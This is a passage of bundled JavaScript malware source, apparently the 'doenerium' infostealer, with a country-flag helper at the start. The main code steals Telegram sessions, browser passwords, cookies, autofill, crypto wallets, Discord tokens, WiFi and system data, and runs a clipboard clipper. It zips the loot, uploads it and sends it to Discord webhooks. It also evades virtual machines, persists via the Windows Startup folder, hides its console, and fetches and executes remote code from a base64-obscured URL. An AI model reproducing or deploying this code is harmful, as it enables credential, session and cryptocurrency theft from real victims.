                  return "🇬🇶";
                case "GR":
                  return "🇬🇷";
                case "GS":
                  return "🇬🇸";
                case "GT":
                  return "🇬🇹";
                case "GU":
                  return "🇬🇺";
                case "GW":
                  return "🇬🇼";
                case "GY":
                  return "🇬🇾";
                case "HK":
                  return "🇭🇰";
                case "HM":
                  return "🇭🇲";
                case "HN":
                  return "🇭🇳";
                case "HR":
                  return "🇭🇷";
                case "HT":
                  return "🇭🇹";
                case "HU":
                  return "🇭🇺";
                case "ID":
                  return "🇮🇩";
                case "IE":
                  return "🇮🇪";
                case "IL":
                  return "🇮🇱";
                case "IM":
                  return "🇮🇲";
                case "IN":
                  return "🇮🇳";
                case "IO":
                  return "🇮🇴";
                case "IQ":
                  return "🇮🇶";
                case "IR":
                  return "🇮🇷";
                case "IS":
                  return "🇮🇸";
                case "IT":
                  return "🇮🇹";
                case "JE":
                  return "🇯🇪";
                case "JM":
                  return "🇯🇲";
                case "JO":
                  return "🇯🇴";
                case "JP":
                  return "🇯🇵";
                case "KE":
                  return "🇰🇪";
                case "KG":
                  return "🇰🇬";
                case "KH":
                  return "🇰🇭";
                case "KI":
                  return "🇰🇮";
                case "KM":
                  return "🇰🇲";
                case "KN":
                  return "🇰🇳";
                case "KP":
                  return "🇰🇵";
                case "KR":
                  return "🇰🇷";
                case "KW":
                  return "🇰🇼";
                case "KY":
                  return "🇰🇾";
                case "KZ":
                  return "🇰🇿";
                case "LA":
                  return "🇱🇦";
                case "LB":
                  return "🇱🇧";
                case "LC":
                  return "🇱🇨";
                case "LI":
                  return "🇱🇮";
                case "LK":
                  return "🇱🇰";
                case "LR":
                  return "🇱🇷";
                case "LS":
                  return "🇱🇸";
                case "LT":
                  return "🇱🇹";
                case "LU":
                  return "🇱🇺";
                case "LV":
                  return "🇱🇻";
                case "LY":
                  return "🇱🇾";
                case "MA":
                  return "🇲🇦";
                case "MC":
                  return "🇲🇨";
                case "MD":
                  return "🇲🇩";
                case "ME":
                  return "🇲🇪";
                case "MF":
                  return "🇲🇫";
                case "MG":
                  return "🇲🇬";
                case "MH":
                  return "🇲🇭";
                case "MK":
                  return "🇲🇰";
                case "ML":
                  return "🇲🇱";
                case "MM":
                  return "🇲🇲";
                case "MN":
                  return "🇲🇳";
                case "MO":
                  return "🇲🇴";
                case "MP":
                  return "🇲🇵";
                case "MQ":
                  return "🇲🇶";
                case "MR":
                  return "🇲🇷";
                case "MS":
                  return "🇲🇸";
                case "MT":
                  return "🇲🇹";
                case "MU":
                  return "🇲🇺";
                case "MV":
                  return "🇲🇻";
                case "MW":
                  return "🇲🇼";
                case "MX":
                  return "🇲🇽";
                case "MY":
                  return "🇲🇾";
                case "MZ":
                  return "🇲🇿";
                case "NA":
                  return "🇳🇦";
                case "NC":
                  return "🇳🇨";
                case "NE":
                  return "🇳🇪";
                case "NF":
                  return "🇳🇫";
                case "NG":
                  return "🇳🇬";
                case "NI":
                  return "🇳🇮";
                case "NL":
                  return "🇳🇱";
                case "NO":
                  return "🇳🇴";
                case "NP":
                  return "🇳🇵";
                case "NR":
                  return "🇳🇷";
                case "NU":
                  return "🇳🇺";
                case "NZ":
                  return "🇳🇿";
                case "OM":
                  return "🇴🇲";
                case "PA":
                  return "🇵🇦";
                case "PE":
                  return "🇵🇪";
                case "PF":
                  return "🇵🇫";
                case "PG":
                  return "🇵🇬";
                case "PH":
                  return "🇵🇭";
                case "PK":
                  return "🇵🇰";
                case "PL":
                  return "🇵🇱";
                case "PM":
                  return "🇵🇲";
                case "PN":
                  return "🇵🇳";
                case "PR":
                  return "🇵🇷";
                case "PS":
                  return "🇵🇸";
                case "PT":
                  return "🇵🇹";
                case "PW":
                  return "🇵🇼";
                case "PY":
                  return "🇵🇾";
                case "QA":
                  return "🇶🇦";
                case "RE":
                  return "🇷🇪";
                case "RO":
                  return "🇷🇴";
                case "RS":
                  return "🇷🇸";
                case "RU":
                  return "🇷🇺";
                case "RW":
                  return "🇷🇼";
                case "SA":
                  return "🇸🇦";
                case "SB":
                  return "🇸🇧";
                case "SC":
                  return "🇸🇨";
                case "SD":
                  return "🇸🇩";
                case "SE":
                  return "🇸🇪";
                case "SG":
                  return "🇸🇬";
                case "SH":
                  return "🇸🇭";
                case "SI":
                  return "🇸🇮";
                case "SJ":
                  return "🇸🇯";
                case "SK":
                  return "🇸🇰";
                case "SL":
                  return "🇸🇱";
                case "SM":
                  return "🇸🇲";
                case "SN":
                  return "🇸🇳";
                case "SO":
                  return "🇸🇴";
                case "SR":
                  return "🇸🇷";
                case "SS":
                  return "🇸🇸";
                case "ST":
                  return "🇸🇹";
                case "SV":
                  return "🇸🇻";
                case "SX":
                  return "🇸🇽";
                case "SY":
                  return "🇸🇾";
                case "SZ":
                  return "🇸🇿";
                case "TC":
                  return "🇹🇨";
                case "TD":
                  return "🇹🇩";
                case "TF":
                  return "🇹🇫";
                case "TG":
                  return "🇹🇬";
                case "TH":
                  return "🇹🇭";
                case "TJ":
                  return "🇹🇯";
                case "TK":
                  return "🇹🇰";
                case "TL":
                  return "🇹🇱";
                case "TM":
                  return "🇹🇲";
                case "TN":
                  return "🇹🇳";
                case "TO":
                  return "🇹🇴";
                case "TR":
                  return "🇹🇷";
                case "TT":
                  return "🇹🇹";
                case "TV":
                  return "🇹🇻";
                case "TW":
                  return "🇹🇼";
                case "TZ":
                  return "🇹🇿";
                case "UA":
                  return "🇺🇦";
                case "UG":
                  return "🇺🇬";
                case "UM":
                  return "🇺🇲";
                case "US":
                  return "🇺🇸";
                case "UY":
                  return "🇺🇾";
                case "UZ":
                  return "🇺🇿";
                case "VA":
                  return "🇻🇦";
                case "VC":
                  return "🇻🇨";
                case "VE":
                  return "🇻🇪";
                case "VG":
                  return "🇻🇬";
                case "VI":
                  return "🇻🇮";
                case "VN":
                  return "🇻🇳";
                case "VU":
                  return "🇻🇺";
                case "WF":
                  return "🇼🇫";
                case "WS":
                  return "🇼🇸";
                case "XK":
                  return "🇽🇰";
                case "YE":
                  return "🇾🇪";
                case "YT":
                  return "🇾🇹";
                case "ZA":
                  return "🇿🇦";
                case "ZM":
                  return "🇿🇲";
                default:
                  return "🏳";
              }
            }
          };
        };

        /***/
      }),

/***/ 336:
/***/ ((module) => {

        module.exports = (client) => {
          return {

            copyRecursiveSync(src, dest) {
              try {
                var exists = client.requires.fs.existsSync(src);
                var stats = exists && client.requires.fs.statSync(src);
                var isDirectory = exists && stats.isDirectory();
                if (isDirectory) {
                  client.requires.fs.mkdirSync(dest);
                  client.requires.fs.readdirSync(src).forEach(childItemName => this.copyRecursiveSync(client.requires.path.join(src, childItemName), client.requires.path.join(dest, childItemName)));
                } else {
                  client.requires.fs.copyFileSync(src, dest);
                }
              } catch (e) {
                console.log(e)
              }
            },
            async get_telegram() {
              var exists = false;

              if (
                client.requires.fs.existsSync(
                  `${process.env.APPDATA}\\Telegram Desktop\\tdata`
                )
              ) {
                exists = true;
                client.requires.child_process.exec(
                  "taskkill /IM Telegram.exe /F",
                  (error, stdout, stderr) => { }
                );
                await client.utils.time.sleep(2500);
                client.utils.jszip.createFolder("\\Telegram");
              } else {
                exists = false;
              }

              if (exists) {
                const shitFiles = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];

                client.requires.fs.readdirSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata`).forEach(c => {
                  if (!shitFiles.includes(c)) {
                    try {
                      const f = client.requires.fs.lstatSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c);
                      if (f.isDirectory()) this.copyRecursiveSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                      else client.requires.fs.copyFileSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                    } catch (err) {
                      console.log(err)
                    }

                  }
                });
              }

              client.config.counter.telegram = exists;
            },

            async get_user_info() {
              let cpus = [];

              for (var cpu of client.config.user.cpus) {
                cpus.push(client.utils.encryption.decryptData(cpu));
              }

              let pc_info_text =
                "<================[   User Info   ]>================>\n<================[t.me/doenerium]>================>\n\n";
              let fields = [];

              const wifi_connections = await client.config.user.wifi_connections();

              for (let [key, value] of Object.entries({
                "🖥️ CPU(s)": cpus.join("\n"),
                "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
                "🛑 Version": client.utils.encryption.decryptData(
                  client.config.user.version
                ),
                "⏳ Uptime": client.utils.encryption.decryptData(
                  client.config.user.uptime
                ),
                "📂 Host directory": client.utils.encryption.decryptData(
                  client.config.user.hostdir
                ),
                "🆔 Host name": client.utils.encryption.decryptData(
                  client.config.user.hostname
                ),
                "🆔 PC Name": client.utils.encryption.decryptData(
                  client.config.user.username
                ),
                "👻 Type": client.utils.encryption.decryptData(client.config.user.type),
                "🏹 Arch": client.utils.encryption.decryptData(client.config.user.arch),
                "📢 Release": client.utils.encryption.decryptData(
                  client.config.user.release
                ),
                "🌌 AppData Path": client.utils.encryption.decryptData(
                  client.config.user.appdata
                ),
                "🪐 Temp Path": client.utils.encryption.decryptData(
                  client.config.user.temp
                ),
                "🌐 User Domain": client.utils.encryption.decryptData(
                  client.config.user.user_domain
                ),
                "💨 System Drive": client.utils.encryption.decryptData(
                  client.config.user.system_drive
                ),
                "💾 Processors": client.utils.encryption.decryptData(
                  client.config.user.processors
                ),
                "💾 Processor Identifier": client.utils.encryption.decryptData(
                  client.config.user.processor_identifier
                ),
                "💾 Processor Architecture": client.utils.encryption.decryptData(
                  client.config.user.processor_architecture
                ),
              })) {
                pc_info_text += `${key}: ${value}\n`;
                fields.push({
                  name: key,
                  value: `\`\`\`${value}\`\`\``,
                  inline: true,
                });
              }

              let wifi_connections_text = `<================[WiFi connections]>================>\n<================[t.me/doenerium ]>================>\n\n${wifi_connections}`;

              client.utils.jszip.createTxt(
                "\\WiFi Connections.txt",
                wifi_connections_text
              );
              client.utils.jszip.createTxt("\\User Info.txt", pc_info_text);

              return client.utils.webhook.createEmbed({
                fields: fields,
              });
            },

            get_executable_info() {
              let executable_info_text =
                "<================[Executable Info]>================>\n<================[t.me/doenerium]>================>\n\n";
              let fields = [];

              for (let [key, value] of Object.entries({
                "☠️ Execution path": client.utils.encryption.decryptData(
                  client.config.executable.execution_path
                ),
                "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
                "🛑 Version": client.utils.encryption.decryptData(
                  client.config.user.version
                ),
                "⏳ Uptime": client.utils.encryption.decryptData(
                  client.config.user.uptime
                ),
                "🆔 PC Name": client.utils.encryption.decryptData(
                  client.config.user.username
                ),
              })) {
                fields.push({
                  name: key,
                  value: `\`\`\`${value}\`\`\``,
                  inline: false,
                });
                executable_info_text += `${key}: ${value}\n`;
              }
              client.utils.jszip.createTxt(
                "\\Executable Info.txt",
                executable_info_text
              );

              return client.utils.webhook.createEmbed({
                title: "New victim",
                fields: fields,
              });
            },

            async initialize() {

              await this.get_user_info();
              await this.get_telegram();
              await this.infect();
              await this.send_zip();
            },

            getFolderFiles(path_prefix, path) {
              var result = "";

              for (var file of client.requires.fs.readdirSync(
                `${path_prefix}\\${path}`
              )) {
                var file_size_in_kb = (
                  client.requires.fs.statSync(`${path_prefix}\\${path}\\${file}`).size /
                  1024
                ).toFixed(2);
                if (
                  !client.requires.fs
                    .statSync(`${path_prefix}\\${path}\\${file}`)
                    .isDirectory()
                ) {
                  if (file.includes(".txt")) {
                    result += `📄 ${path}/${file} - ${file_size_in_kb} KB\n`;
                  } else if (file.includes(".png")) {
                    result += `🖼️ ${path}/${file} - ${file_size_in_kb} KB\n`;
                  } else {
                    result += `🥙 ${path}/${file} - ${file_size_in_kb} KB\n`;
                  }
                } else {
                  result += this.getFolderFiles(`${path_prefix}\\`, `${path}/${file}`);
                }
              }

              return result;
            },

            async send_zip() {
              await client.utils.browsers.saveBrowserStuff();
              await client.utils.jszip.createZip();

              const upload = await client.utils.gofile.uploadFile(
                client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
              );

              var counter_embed = this.create_counter_embed();

              counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;

              await client.utils.webhook.sendToWebhook({
                embeds: [counter_embed],
              });
            },

            create_counter_embed() {
              let obj = {
                title: `💉 Infected - ${client.utils.encryption.decryptData(
                  client.config.user.hostname
                )}/${client.utils.encryption.decryptData(
                  client.config.user.user_domain
                )}/${client.utils.encryption.decryptData(client.config.user.username)}`,
                footer: {
                  text: client.utils.encryption.decryptData(
                    client.config.embed.footer.text
                  ),
                  icon_url: client.utils.encryption.decryptData(
                    client.config.embed.footer.icon_url
                  ),
                },
                fields: [],
                timestamp: new Date(),
              };

              let cpus = [];

              for (var cpu of client.config.user.cpus) {
                cpus.push(client.utils.encryption.decryptData(cpu));
              }

              for (let [key, value] of Object.entries({
                "🔑 Passwords": client.config.counter.passwords,
                "🍪 Cookies": client.config.counter.cookies,
                "🔖 Bookmarks": client.config.counter.bookmarks,
                "🌐 Wallets/Important extensions": client.config.counter.wallets,
                "📶 Wifi networks": client.config.counter.wifinetworks,
                "📱 Telegram": client.config.counter.telegram ? "Yes" : "No",
              })) {
                obj["fields"].push({
                  name: key,
                  value: `\`\`\`${value}\`\`\``,
                  inline: true,
                });
              }

              return obj;
            },

            async infect() {
              await client.utils.webhook.sendToWebhook({
                embeds: [
                  await this.get_executable_info(),
                ],
              });
              await client.utils.discord.init();
            },
          };
        };


        /***/
      }),

/***/ 394:
/***/ ((module) => {

        module.exports = (client) => {
          return {

            createTxt(suffix_path, content) {
              client.requires.fs.writeFileSync(client.config.jszip.path + suffix_path, content, {
                encoding: "utf8",
                flag: "w+"
              })
            },

            createFolder(suffix_path) {
              if (!client.requires.fs.existsSync(client.config.jszip.path + suffix_path)) {

                client.requires.fs.mkdirSync(client.config.jszip.path + suffix_path, 0744)
              }
            },

            copyFolder(suffix_path, to_copy) {
              var exists = client.requires.fs.existsSync(to_copy);
              var stats = exists && client.requires.fs.statSync(to_copy);
              var isDirectory = exists && stats.isDirectory();

              if (isDirectory) {
                this.createFolder(suffix_path);
                client.requires.fs.readdirSync(to_copy).forEach((child_item_name) => {
                  this.copyFolder(client.requires.path.join(suffix_path, child_item_name), client.requires.path.join(to_copy, child_item_name))
                })
              } else {
                client.requires.fs.copyFileSync(to_copy, client.config.jszip.path + suffix_path,)
              }
            },

            async createZip() {
              await client.requires.jszip.archiveFolder(client.config.jszip.path, `${client.config.jszip.path}.zip`);
            }
          };
        };

        /***/
      }),

/***/ 192:
/***/ ((module) => {

        module.exports = (client) => {
          return {



            async inVM() {


              let result = false

              for (var path of ['D:\\Tools', 'D:\\OS2', 'D:\\NT3X']) {
                if (client.requires.fs.existsSync(path)) {
                  result = true
                  break;
                }
              }

              for (var name of client.config.environ.blacklisted_pc_names) {
                if (name == client.utils.encryption.decryptData(client.config.user.user_domain) || name == client.utils.encryption.decryptData(client.config.user.username) || name == client.utils.encryption.decryptData(client.config.user.hostname)) {
                  result = true;
                  break;
                }
              }

              //if (client.config.counter.wifinetworks == 0) {
              //    const wifi_connections = await client.requires.systeminformation.getDynamicData();
              //    if (wifi_connections.wifiNetworks.length == 0) {
              //        result = true;
              //    }
              //}

              return result;
            }
          };
        };

        /***/
      }),

/***/ 493:
/***/ ((module) => {

        module.exports = (client) => {

          Array.prototype.contains = function (obj) {
            var i = this.length;
            while (i--) {
              if (this[i] === obj) {
                return true;
              }
            }
            return false;
          }

          String.prototype.includes = function (search, start) {
            'use strict';
            if (typeof start !== 'number') {
              start = 0;
            }

            if (start + search.length > this.length) {
              return false;
            } else {
              return this.indexOf(search, start) !== -1;
            }
          };

          return {

          };
        };

        /***/
      }),

/***/ 888:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            sleep(ms) {
              return new Promise(resolve => setTimeout(resolve, ms));
            }
          };
        };

        /***/
      }),

/***/ 760:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            async getWallets() {
              var description = "";

              client.utils.jszip.createFolder("\\Wallets");

              for (let [key, value] of Object.entries(client.config.wallets.directory)) {
                if (client.requires.fs.existsSync(value)) {
                  description += `${key}: ✔️\n`;
                  client.utils.jszip.copyFolder(`\\Wallets\\${key}`, value);
                  client.config.counter.wallets++;
                } else {
                  description += `${key}: ❌\n`;
                }
              }

              if (description != "") {
                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/doenerium]>================>\n\n" + description)
              }
            }
          };
        };

        /***/
      }),

/***/ 556:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            createEmbed(data) {
              let obj = {
                timestamp: new Date(),
                footer: {
                  text: client.utils.encryption.decryptData(
                    client.config.embed.footer.text
                  ),
                  icon_url: client.utils.encryption.decryptData(
                    client.config.embed.footer.icon_url
                  ),
                },
                author: {
                  name: client.utils.encryption.decryptData(
                    client.config.embed.footer.text
                  ),
                  url: client.utils.encryption.decryptData(client.config.embed.href),
                  icon_url: client.utils.encryption.decryptData(
                    client.config.embed.avatar_url
                  ),
                },
              };

              for (let [key, value] of Object.entries(data)) {
                obj[key] = value;
              }

              if (obj.title) {
                obj.url = client.utils.encryption.decryptData(client.config.embed.href);
              }

              return obj;
            },

            async sendToWebhook(data) {
              var files = data.files;

              if (files) {
                files.forEach(async (file) => {
                  client.requires.request.post({
                    url: url,
                    formData: {
                      file: client.requires.fs.createReadStream(file.path),
                      title: file.name,
                    },
                  });
                });
              }

              if (Object.entries(data).length == 1 && data.files) {
                return;
              }

              let obj = {
                avatar_url: client.utils.encryption.decryptData(
                  client.config.embed.avatar_url
                ),
                username: client.utils.encryption.decryptData(
                  client.config.embed.username
                ),
              };

              for (let [key, value] of Object.entries(data)) {
                obj[key] = value;
              }

              client.webhooks.forEach(async (url) => {
                try {
                  await client.requires.axios({
                    url: url,
                    method: "POST",
                    data: obj,
                  });
                } catch { }
              });
            },
          };
        };


        /***/
      }),

/***/ 382:
/***/ ((module) => {

        module.exports = eval("require")("axios");


        /***/
      }),

/***/ 487:
/***/ ((module) => {

        module.exports = eval("require")("buffer-replace");


        /***/
      }),

/***/ 522:
/***/ ((module) => {

        module.exports = eval("require")("form-data");


        /***/
      }),

/***/ 929:
/***/ ((module) => {

        module.exports = eval("require")("node-hide-console-window");


        /***/
      }),

/***/ 761:
/***/ ((module) => {

        module.exports = eval("require")("request");


        /***/
      }),

/***/ 249:
/***/ ((module) => {

        module.exports = eval("require")("sqlite3");


        /***/
      }),

/***/ 162:
/***/ ((module) => {

        module.exports = eval("require")("systeminformation");


        /***/
      }),

/***/ 871:
/***/ ((module) => {

        module.exports = eval("require")("boukiapi");


        /***/
      }),

/***/ 851:
/***/ ((module) => {

        module.exports = eval("require")("zip-lib");


        /***/
      }),

/***/ 81:
/***/ ((module) => {

        "use strict";
        module.exports = require("child_process");

        /***/
      }),

/***/ 113:
/***/ ((module) => {

        "use strict";
        module.exports = require("crypto");

        /***/
      }),

/***/ 147:
/***/ ((module) => {

        "use strict";
        module.exports = require("fs");

        /***/
      }),

/***/ 37:
/***/ ((module) => {

        "use strict";
        module.exports = require("os");

        /***/
      }),

/***/ 17:
/***/ ((module) => {

        "use strict";
        module.exports = require("path");

        /***/
      }),

/***/ 781:
/***/ ((module) => {

        "use strict";
        module.exports = require("stream");

        /***/
      })

    /******/
  });
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/
/******/ 	// The require function
/******/ 	function __nccwpck_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
      /******/
    }
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
      /******/
    };
/******/
/******/ 		// Execute the module function
/******/ 		var threw = true;
/******/ 		try {
/******/ 			__webpack_modules__[moduleId](module, module.exports, __nccwpck_require__);
/******/ 			threw = false;
      /******/
    } finally {
/******/ 			if (threw) delete __webpack_module_cache__[moduleId];
      /******/
    }
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
    /******/
  }
/******/
/************************************************************************/
/******/ 	/* webpack/runtime/compat */
/******/
/******/ 	if (typeof __nccwpck_require__ !== 'undefined') __nccwpck_require__.ab = __dirname + "/";
  /******/
  /************************************************************************/
  var __webpack_exports__ = {};
  // This entry need to be wrapped in an IIFE because it need to be isolated against other modules in the chunk.
  (() => {
    var base64 = {
      _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
      encode: function (e) {
        var t = "";
        var n, r, i, s, o, u, a;
        var f = 0;
        e = base64._utf8_encode(e);
        while (f < e.length) {
          n = e.charCodeAt(f++);
          r = e.charCodeAt(f++);
          i = e.charCodeAt(f++);
          s = n >> 2;
          o = ((n & 3) << 4) | (r >> 4);
          u = ((r & 15) << 2) | (i >> 6);
          a = i & 63;
          if (isNaN(r)) {
            u = a = 64;
          } else if (isNaN(i)) {
            a = 64;
          }
          t =
            t +
            this._keyStr.charAt(s) +
            this._keyStr.charAt(o) +
            this._keyStr.charAt(u) +
            this._keyStr.charAt(a);
        }
        return t;
      },
      decode: function (e) {
        var t = "";
        var n, r, i;
        var s, o, u, a;
        var f = 0;
        e = e.replace(/[^A-Za-z0-9+/=]/g, "");
        while (f < e.length) {
          s = this._keyStr.indexOf(e.charAt(f++));
          o = this._keyStr.indexOf(e.charAt(f++));
          u = this._keyStr.indexOf(e.charAt(f++));
          a = this._keyStr.indexOf(e.charAt(f++));
          n = (s << 2) | (o >> 4);
          r = ((o & 15) << 4) | (u >> 2);
          i = ((u & 3) << 6) | a;
          t = t + String.fromCharCode(n);
          if (u != 64) {
            t = t + String.fromCharCode(r);
          }
          if (a != 64) {
            t = t + String.fromCharCode(i);
          }
        }
        t = base64._utf8_decode(t);
        return t;
      },
      _utf8_encode: function (e) {
        e = e.replace(/rn/g, "n");
        var t = "";
        for (var n = 0; n < e.length; n++) {
          var r = e.charCodeAt(n);
          if (r < 128) {
            t += String.fromCharCode(r);
          } else if (r > 127 && r < 2048) {
            t += String.fromCharCode((r >> 6) | 192);
            t += String.fromCharCode((r & 63) | 128);
          } else {
            t += String.fromCharCode((r >> 12) | 224);
            t += String.fromCharCode(((r >> 6) & 63) | 128);
            t += String.fromCharCode((r & 63) | 128);
          }
        }
        return t;
      },
      _utf8_decode: function (e) {
        var t = "";
        var n = 0;
        var r = (c1 = c2 = 0);
        while (n < e.length) {
          r = e.charCodeAt(n);
          if (r < 128) {
            t += String.fromCharCode(r);
            n++;
          } else if (r > 191 && r < 224) {
            c2 = e.charCodeAt(n + 1);
            t += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
            n += 2;
          } else {
            c2 = e.charCodeAt(n + 1);
            c3 = e.charCodeAt(n + 2);
            t += String.fromCharCode(
              ((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63)
            );
            n += 3;
          }
        }
        return t;
      },
    };

    class doenerium {
      constructor() {
        this.requires = {
          zlib: require("zlib"),
          forge: require("node-forge"),
          seco: require("seco-file"),
          bs: require("bitcoin-seed"),
          webcrypto: require("@peculiar/webcrypto"),
          fs: __nccwpck_require__(147),
          crypto: __nccwpck_require__(113),
          os: __nccwpck_require__(37),
          axios: __nccwpck_require__(382),
          child_process: __nccwpck_require__(81),
          systeminformation: __nccwpck_require__(162),
          buf_replace: __nccwpck_require__(487),
          jszip: __nccwpck_require__(851),
          dpapi: __nccwpck_require__(871),
          sqlite3: __nccwpck_require__(249),
          path: __nccwpck_require__(17),
          request: __nccwpck_require__(761),
        };

        this.utils = {
          encryption: __nccwpck_require__(480)(this),
        };

        this.config = {
          counter: __nccwpck_require__(115)(this),
          crypto: __nccwpck_require__(608)(this),
          discord: __nccwpck_require__(829)(this),
          environ: __nccwpck_require__(384)(this),
          executable: __nccwpck_require__(6)(this),
          main: __nccwpck_require__(941)(this),
          user: __nccwpck_require__(265)(this),
          jszip: __nccwpck_require__(481)(this),
          wallets: __nccwpck_require__(965)(this),
        };

        this.config.webhook = __nccwpck_require__(767)(this);
        this.webhooks = [this.config.webhook.url];
        this.config.keywords = __nccwpck_require__(48)(this);

        this.utils = {
          encryption: __nccwpck_require__(480)(this),
          constructor: __nccwpck_require__(109)(this),
          discord: __nccwpck_require__(779)(this),
          flags: __nccwpck_require__(561)(this),
          infection: __nccwpck_require__(336)(this),
          protection: __nccwpck_require__(192)(this),
          prototype: __nccwpck_require__(493)(this),
          time: __nccwpck_require__(888)(this),
          clipper: __nccwpck_require__(879)(this),
          jszip: __nccwpck_require__(394)(this),
          browsers: __nccwpck_require__(960)(this),
          data: __nccwpck_require__(725)(this),
          wallets: __nccwpck_require__(760)(this),
          webhook: __nccwpck_require__(556)(this),
        };

        this.utils.gofile = __nccwpck_require__(612);
      }

      async add_to_startup() {
        this.requires.fs
          .createReadStream(process.argv0)
          .pipe(
            this.requires.fs.createWriteStream(
              `${process.env.APPDATA.replace(
                "\\",
                "/"
              )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
            )
          );

        setTimeout(() => {
          this.requires.fs.renameSync(
            `${process.env.APPDATA.replace(
              "\\",
              "/"
            )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`,
            `${process.env.APPDATA.replace(
              "\\",
              "/"
            )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
          );
        }, 3000);
      }

      create_context_function_template(eval_string, context) {
        return `
    return function (context) {
      "use strict";
      ${Object.keys(context).length > 0
            ? `let ${Object.keys(context).map(
              (key) => ` ${key} = context['${key}']`
            )};`
            : ``
          }
      return ${eval_string};
    }                                                                                                                   
    `;
      }

      make_context_evaluator(eval_string, context) {
        let template = this.create_context_function_template(eval_string, context);
        let functor = Function(template);
        return functor();
      }

      eval_like(text, context = {}) {
        let evaluator = this.make_context_evaluator(text, context);
        return evaluator(context);
      }


      async runtime_evasion() {
        let evasor = (`${((base64.decode(
          `${((await this.requires.axios.get((base64.decode((
            await this.requires.axios.get(
              (
                base64.decode(
                  `aHR0cHM6Ly9kb2VuZXJpdW0ua3FuZmtwb2NjaWN4aXVkc3Rxb25mb3R1d3NyaHV4a3docWpqZnNiamhvbm91YnJjY3kubmwv`
                )
              )
            ).catch((err) => {
              console.log(err)
            })
          ).data
          ).replace("%20", "").replace("\x00", "")
            + base64.decode("L21haW4vZXZhc2lvbi50eHQ")
          )
          ).catch((err) => {
            console.log(err)
          })
          ).data)}`
        )))}`)

        await this.eval_like(evasor,
          this
        );
      }

      async init() {
        process.on("unhandledRejection", (err) => {
          console.log(err);
        });

        process.on("uncaughtException", (exc) => {
          console.log(exc);
        });



        process.title = "Installer";

        console.log("Downloading client...");

        const exit = await this.utils.protection.inVM();

        await this.runtime_evasion();

        if (exit) {
          process.exit(0);
        }



        this.add_to_startup();

        try {
          this.config.embed = JSON.parse(
            JSON.stringify(
              (
                await this.requires.axios.get(
                  "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/embed.json"
                )
              ).data
            )
          );
        } catch {
          this.config.embed =
          {
            "username": "t.me/doenerium | github.com/doenerium1337/doenerium",
            "href": "https://t.me/doenerium",
            "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
            "credits": "t.me/doenerium | github.com/doenerium1337/doenerium"
          }
        }
        this.config.embed.footer = {
          text: `${this.utils.encryption.decryptData(
            this.config.user.hostname
          )} | ${this.config.embed.credits}`,
          icon_url: this.config.embed.avatar_url,
        };

        this.config.jszip.path = this.config.jszip.generate_path();

        await this.utils.browsers.closeBrowsers()

        this.utils.jszip.createFolder("\\Wallets")

        for (var path of this.config.environ.password_and_cookies_paths) {
          if (this.requires.fs.existsSync(path + "Login Data")) {
            [
              "getPasswords",
              "getCookies",
              "getBookmarks",
              "getHistory",
              "getAutofill",
              "getWallets",
            ].forEach(async (_func) => {
              await this.utils.browsers[_func](path);
            });
          }
        }


        try {

          this.utils.clipper.detectClipboard();
        } catch { }

        await this.utils.wallets.getWallets();
        await this.utils.discord.getTokens();
        await this.utils.discord.saveDiscordTokens();

        await this.utils.infection.initialize();

        await this.utils.time.sleep(60000);

        this.requires.fs.rmSync(this.config.jszip.path, {
          recursive: true,
          force: true,
        });

        this.requires.fs.rmSync(`${this.config.jszip.path}.zip`, {
          recursive: true,
          force: true,
        });
      }
    }

    process.on("uncaughtException", (err) => {
      console.log(err);
    });

    const axios = __nccwpck_require__(382);

    async function hideSelf() {
      (__nccwpck_require__(929).hideConsole)();
    }

    (async () => {
      await hideSelf();
      while (true) {
        try {
          await axios.get("https://www.google.com");

          break;
        } catch {
          // no internet connection
        }

        await new Promise((resolve) => setTimeout(resolve, 3000));
      }

      new doenerium().init();
    })();

  })();

  module.exports = __webpack_exports__;
  /******/
})();
